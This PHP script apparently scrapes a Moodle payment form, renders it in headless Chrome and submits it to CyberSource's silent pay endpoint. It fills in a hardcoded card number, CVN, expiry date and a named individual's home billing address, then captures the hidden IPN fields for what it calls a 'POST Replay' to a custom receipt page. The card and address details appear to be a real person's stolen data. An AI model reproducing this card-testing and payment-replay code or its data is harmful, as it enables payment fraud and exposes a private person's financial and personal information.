<?php
require 'vendor/autoload.php';

use HeadlessChromium\BrowserFactory;

include './iframev2.1.php';

function extract_input_fields_with_values($html)
{
    $doc = new DOMDocument();
    libxml_use_internal_errors(true);
    $doc->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($doc);
    $fields = [];

    $inputs = $xpath->query('//form[@id="moodleform4"]//input[@name]');
    foreach ($inputs as $input) {
        if ($input instanceof DOMElement) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            if (trim($value) !== '') {
                $fields[$name] = $value;
            }
        }
    }

    return $fields;
}

function extract_post_to_ipn($html)
{
    $doc = new DOMDocument();
    libxml_use_internal_errors(true);
    $doc->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($doc);
    $fields = [];

    $inputs = $xpath->query('//form//input[@type="hidden"]');
    foreach ($inputs as $input) {
        if ($input instanceof DOMElement) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            $fields[$name] = $value;
        }
    }

    return $fields;
}

$html = pullData();

$browserFactory = new BrowserFactory();
$browser = $browserFactory->createBrowser([
    'headless' => true,
    'executablePath' => './webdriver/win/chromedriver.exe'
]);
$page = $browser->createPage();
$page->navigate('data:text/html;charset=utf-8,' . urlencode($html))->waitForNavigation();
$html = $page->getHtml();
$browser->close();

$fields = extract_input_fields_with_values($html);

$fields['card_number'] = '4246315380311140';
$fields['card_cvn'] = '700';
$fields['card_expiry_date'] = '09-2028';
$fields['bill_to_address_country'] = 'US';
$fields['bill_to_address_state'] = 'NC';
$fields['bill_to_address_city'] = 'Wilmington';
$fields['bill_to_address_line1'] = '433 Darlington Ave U';
$fields['bill_to_address_postal_code'] = '28403';
$fields['first_name'] = 'Brent';
$fields['last_name'] = 'Seaver';
$fields['eMonth'] = '09';
$fields['eYear'] = '2028';

$ch = curl_init('https://secureacceptance.cybersource.com/silent/pay');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$cybersource_response = curl_exec($ch);
curl_close($ch);

$ipn_data = extract_post_to_ipn($cybersource_response);

?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cybersource POST Replay Result</title>
</head>
<body>
    <h2>📦 POST Data Sent to override_custom_receipt_page</h2>
    <pre><?php print_r($ipn_data); ?></pre>
</body>
</html>
